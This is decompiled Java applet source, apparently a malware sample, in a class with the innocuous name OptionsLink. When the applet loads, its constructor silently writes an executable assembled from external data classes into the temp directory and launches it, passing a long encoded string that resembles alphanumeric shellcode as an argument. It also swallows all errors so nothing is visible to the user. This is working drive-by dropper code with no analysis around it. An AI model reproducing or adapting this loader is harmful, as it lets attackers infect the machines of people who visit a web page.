import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class OptionsLink extends Applet
{
    public OptionsLink() {
        try {
            final File file = new File(System.getProperty("java.io.tmpdir") + "201763.exe");
            final String[] array = new String[2];
            if (!file.exists()) {
                array[0] = file.getAbsolutePath();
                array[1] = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIlJHLIwpc030aplI9u01N2qtlK62P0lKSbvlnk2rR4nkbRwXVox7SzGVP1yoUaiPLlUlpaCLtB6LWPJaxO6mWqxGyrxpaBf7LKRrtPlKcr7L31Zpnkg0sHK5O0qdCzvajpV0LKBh5HLKqHQ0c1YC9sUlqYLKTtNkVaZvuaYoP1IPllkqzotM6azggHM0RU9dS3qmKHGK3M4dT5zBf8NkV87T31iCCVnk6l2knkv8WlFaN3lKeTnk5Q8PmYCtgTvD3k3ksQciCjrq9om0BxcobzlKUBXkmVsmQxrN0eptGpCX47sYPnSYLIJFF4sXrlrWtfUWKOXU5aKOPWSgSgv7aFCXVZcfd9oWIohUxksoCk5aYYbqBqQz6cbqpQsXMkVaEPs02s60Phv7oyOo8FIoJu8kpHcifQkbSb5830DrOPotsbBr1BV1aBf0qxHkaEFNEk9oyEK9JfCZ6p3kcXopVS30wpOym0CZFdRp3Z5OF62H45rfMNNfIokeeaIobwCgbwaGF6584mFfghsKIohUNeiPbUuJRk1db0zKyEZKg9JHlsKOIoYo4og9BnbiqDBmC0Qx8pOENBSf9oiEPjqP0h7pr0wp7psX5PS0w07p67rHrxY4Bs9u9on5Z3ccrsMYkWf7U8GpwPUPWp2srvsXUBlVoyIriohUK5O0adxMLKC7UQXCneKpt5m5pXZcixpQyoyoKOEgtpfNdxGIvNFY4pDnEaDweb5PAA";
                file.createNewFile();
                final DataOutputStream dataOutputStream = new DataOutputStream(new BufferedOutputStream(new FileOutputStream(file)));
                dataOutputStream.write(UpdateData0.data);
                dataOutputStream.write(UpdateData1.data);
                dataOutputStream.write(UpdateData2.data);
                dataOutputStream.write(UpdateData3.data);
                dataOutputStream.write(UpdateData4.data);
                dataOutputStream.write(UpdateData5.data);
                dataOutputStream.write(UpdateData6.data);
                dataOutputStream.write(UpdateData7.data);
                dataOutputStream.write(UpdateData8.data);
                dataOutputStream.write(UpdateData9.data);
                dataOutputStream.write(UpdateData10.data);
                dataOutputStream.flush();
                dataOutputStream.close();
                Runtime.getRuntime().exec(array);
            }
        }
        catch (Exception ex) {}
    }
}
